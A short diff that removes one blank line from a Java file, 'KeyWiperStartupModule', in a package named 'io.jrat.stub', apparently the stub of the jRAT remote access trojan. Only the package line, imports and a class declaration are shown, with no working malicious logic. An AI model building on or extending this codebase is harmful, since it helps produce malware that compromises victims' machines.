@@ -1,7 +1,6 @@
 package io.jrat.stub.modules.startup;
 
 import io.jrat.stub.Configuration;
-
 import java.util.Map;
 
 public class KeyWiperStartupModule extends StartupModule {
